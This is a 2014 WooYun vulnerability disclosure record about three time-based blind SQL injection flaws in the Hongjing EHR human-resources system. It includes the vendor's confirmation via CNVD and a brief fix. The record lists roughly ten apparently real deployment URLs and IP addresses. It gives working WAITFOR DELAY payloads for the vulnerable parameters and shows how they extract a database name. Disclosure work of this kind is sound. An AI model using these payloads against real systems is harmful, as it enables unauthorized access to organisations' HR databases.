{"id": 49133, "wybug_id": "wooyun-2014-075122", "wybug_title": "宏景EHR系统3处SQL注射漏洞", "wybug_corp": "北京宏景世纪软件股份有限公司", "wybug_author": "路人甲", "wybug_date": "2014-09-05 16:55", "wybug_open_date": "2014-12-04 16:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向公众公开  简要描述： 某EHR系统 3处SQL注射漏洞 详细说明：  存在漏洞的是 北京宏景世纪软件股份有限公司研发的宏景EHR系统公司官网：http://www.hjsoft.com.cn/官方大量政企高端用户:http://www.hjsoft.com.cn/2525/1040/index.shtml一些案例:\nhttp://60.190.203.25:59999/templates/index/hrlogon.jsphttp://ehr.topsearch.com.hk/templates/index/hrlogon.jsphttp://221.123.128.41/templates/index/hrlogon.jsphttp://hr.bjn3cc.com/templates/index/hrlogon.jsphttp://202.205.112.6/templates/index/hrlogon.jsphttp://27.112.9.28:8081/templates/index/hrlogon.jsphttp://intranet.topsearch.com.hk/templates/index/hrlogon.jsphttp://218.64.68.150:8888/templates/index/hrlogon.jsphttp://hr.airport.gx.cn:8089/templates/index/hrlogon.jsphttp://61.133.218.206:8888/templates/index/hrlogon.jsp\n测试网站：http://www.hjsoft.com.cn:8089/（官方在线试用）1.由于/pos/posbusiness/train_get_code_tree.jsp页面参数codesetid未安全过滤导致SQL延时注射漏洞2.由于/servlet/sys/option/customreport/tree页面参数id未安全过滤导致SQL延时注射漏洞3.由于/system/report_orgtree.jsp页面参数report_type未安全过滤导致SQL延时注射漏洞漏洞复现:\n1.判断数据库名长度：http://www.hjsoft.com.cn:8089/pos/posbusiness/train_get_code_tree.jsp?codesetid=1' IF(len(DB_NAME()))>=5 WAITFOR DELAY '0:0:5'--%20判断数据库名第一个字符的ASCII码值：http://www.hjsoft.com.cn:8089/pos/posbusiness/train_get_code_tree.jsp?codesetid=1' IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=121) WAITFOR DELAY '0:0:5'--%202.http://www.hjsoft.com.cn:8089/servlet/sys/option/customreport/treePOST DATA 判断数据库名长度：id=' IF(len(DB_NAME()))>=5 WAITFOR DELAY '0:0:5'--%20&codeset=null&method=tree&priv=undefined&level=undefined&node=3POST DATA 判断数据库名第一个字符的ASCII码值：id=' IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=121) WAITFOR DELAY '0:0:5'--%20&codeset=null&method=tree&priv=undefined&level=undefined&node=33.判断数据库名长度：http://www.hjsoft.com.cn:8089/system/report_orgtree.jsp?unitcode=3&report_type=1 IF(len(DB_NAME()))>=5 WAITFOR DELAY '0:0:5'--%20判断数据库名第一个字符的ASCII码值：http://www.hjsoft.com.cn:8089/system/report_orgtree.jsp?unitcode=3&report_type=1 IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=121) WAITFOR DELAY '0:0:5'--%20\n   漏洞证明：  1.判断数据库名长度：a.设置数据库名长度>=5时，页面存在延时，即判断条件成立。参数codesetid:\n\n参数id:\n\n参数report_type:\n\nb.设置数据库名长度>=6时，页面不存在延时，即判断条件不成立，即数据库名长度为5。参数codesetid:\n\n参数id:\n\n参数report_type:\n\n2.判断数据库名第一个字符的ASCII码值a.设置数据库名第一个字符的ASCII码值>=121,页面存在延时，即判断条件成立参数codesetid:\n\n参数id:\n\n参数report_type:\n\nb.设置数据库名第一个字符的ASCII码值>=122,页面不存在延时，即判断条件不成立，即数据库名第一个字符的ASCII码值为121，即字符y参数codesetid:\n\n参数id:\n\n参数report_type:\n\n根据此方法依次可得出数据库名各个位对应的ASCII码值121 107 99 104 114 ，即数据库名为ykchr   修复方案：  对参数是否是数字型进行判断过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-09-10 09:13 厂商回复： CNVD确认并复现所述情况，由CNVD通过软件生产厂商公开邮箱联系方式向其通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}